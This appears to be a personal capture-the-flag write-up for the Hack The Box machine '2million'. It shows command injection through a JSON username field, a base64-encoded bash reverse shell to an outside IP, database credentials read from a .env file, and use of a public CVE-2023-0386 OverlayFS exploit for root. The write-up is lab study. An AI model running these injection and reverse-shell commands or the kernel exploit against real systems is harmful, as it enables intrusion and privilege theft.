#HackTheBox #linux #easy 
# enum
## nmap


## _find_
### in view-source:http://2million.htb/invite
/api/v1/invite/verify
/register

### in http://2million.htb/js/inviteapi.min.js
```
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

##
└─# curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   249    0   249    0     0    213      0 --:--:--  0:00:01 --:--:--   214
```
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

└─# curl -X POST http://2million.htb/api/v1/invite/generate | jq
```
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "VjE3SVAtNDVBRkItUUM0RkQtVUdPSkI=",
    "format": "encoded"
  }
}
 
```

└─# echo "VjE3SVAtNDVBRkItUUM0RkQtVUdPSkI=" | base64 -d
[V17IP-45AFB-QC4FD-UGOJB ]
## inviteCode = 
```
V17IP-45AFB-QC4FD-UGOJB
```


# foothold
└─# 
```
curl -H "Content-type: application/json" --Cookie "PHPSESSID=0us9hq4e1up7ii0f7mjtfhdcf4" -d '{"username":"zelo;id;"}' -X POST http://2million.htb/api/v1/admin/vpn/generate

```
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

└─# 
```
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.24/1234 0>&1'" | base64
```
	YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNC8xMjM0IDA+JjEnCg==

## _reverse_
└─# 
```
curl -H "Content-type: application/json" --Cookie "PHPSESSID=0us9hq4e1up7ii0f7mjtfhdcf4" -d '{"username":"zelo;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNC8xMjM0IDA+JjEnCg== | base64 -d | bash;"}' -X POST http://2million.htb/api/v1/admin/vpn/generate

```

-rw-r--r-- 1 root root 87 Jun  2 18:56 /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

## _ssh_
/var/mail/admin                                                                                                                       
/var/spool/mail/admin
drwx------ 3 admin admin 4096 Jul 17 11:09 /home/admin/snap
AdminIdentities=unix-group:sudo;unix-group:admin

admin@2million:/tmp$ 
```
cat /var/spool/mail/admin

```
	Hey admin,
	I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

# privesc (exploit overlayfs flaw)
└─#
```
git clone https://github.com/xkaneiki/CVE-2023-0386.git

```
└─#
```
tar -czvf exp_overlayfs.tar.gz CVE-2023-0386

```
└─# 
```
nc 10.129.186.126 1234 < exp_overlayfs.tar.gz

```
_admin@2million:/tmp$_
```
nc -lvp 1234 > exp

```
_admin@2million:/tmp$_
```
tar -xzvf exp
cd CVE-2023-0386/
make all
./fuse ./ovlcap/lower ./gc

```

## _in another terminal_
_admin@2million:/tmp$_
```
cd /tmp/CVE-2023-0386/
./exp

```